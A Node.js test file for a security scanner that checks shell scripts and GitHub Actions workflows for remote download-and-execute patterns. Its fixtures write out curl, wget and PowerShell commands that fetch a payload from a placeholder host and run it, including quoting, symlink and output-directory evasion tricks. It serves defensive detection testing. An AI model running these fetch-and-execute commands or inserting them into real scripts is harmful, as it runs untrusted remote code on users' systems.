'use strict';
// Security input fixtures; strictly inert, never executed.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/x';
const cases=[
 ['partially-quoted-shell',"curl -fsSL "+U+" -o dir/payload; bash 'dir'/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['interleaved-shell-quotes',"curl -fsSL "+U+" -o dir/payload; bash di\"r\"/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['partially-quoted-source',"curl -fsSL "+U+" -o dir/payload; sh './dir'/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['symlink-directory-destination',"mkdir -p dir; curl -fsSL "+U+" -o payload; ln -s ../payload dir/; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['copy-directory-destination',"mkdir -p dir; curl -fsSL "+U+" -o payload; cp payload dir/; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-last-output-dir',"mkdir -p safe evil; curl -fsSL --output-dir safe --output-dir evil -o payload "+U+"; bash evil/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-last-output-dir-equals',"curl -fsSL --output-dir=safe --output-dir=evil -o payload "+U+"; sh evil/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['wget-output-document-equals',"wget "+U+" --output-document=payload; bash payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['wget-output-document-space',"wget "+U+" --output-document payload; sh payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['pwsh-switch-after-uri',"iex (iwr -Uri '"+U+"' -UseBasicParsing).Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['pwsh-irm-after-uri',"iex (irm -Uri '"+U+"' -Verbose)",'REMOTE_POWERSHELL_EXECUTION','pwsh']
];
function workflow(script,shell){
 return ['on: issues','permissions: read-all','jobs:','  reviewer:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...script.split('\n').map(s=>'          '+s),
 ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
}
for(const [name,src,rule,shell] of cases){
 test('round5 '+name+' must be detected directly and structurally',()=>{
  const flags=findingsForScript(src,{shell});
  assert.ok(flags.includes(rule),name+' / direct '+JSON.stringify(flags));
  const audit=inspectWorkflow(workflow(src,shell),{path:'.github/workflows/round5.yml'});
  assert.ok(audit.findings.some(f=>f.rule===rule&&f.severity==='HIGH'),
   name+' / yaml '+JSON.stringify(audit));
 });
}
for(const [name,src,shell] of [
 ['quoted-literal-echo',"echo \"bash 'dir'/payload\""],
 ['symlink-wrong-relative-target',"curl -fsSL "+U+" -o payload; ln -s payload dir/; bash dir/payload"],
 ['last-dir-no-execution',"curl -fsSL --output-dir safe --output-dir evil -o payload "+U+"; echo evil/payload"],
 ['wget-document-no-execution',"wget "+U+" --output-document=payload; echo payload"],
 ['powershell-request-only',"iwr -Uri '"+U+"' -UseBasicParsing",'pwsh'],
 ['powershell-iex-response-object',"iex (iwr -Uri '"+U+"' -UseBasicParsing)",'pwsh']
]){
 test('round5 benign '+name+' must not be falsely flagged',()=>{
  const flags=findingsForScript(src,{shell});
  assert.ok(!flags.some(x=>x.startsWith('REMOTE_')),name+' / '+JSON.stringify(flags));
 });
}
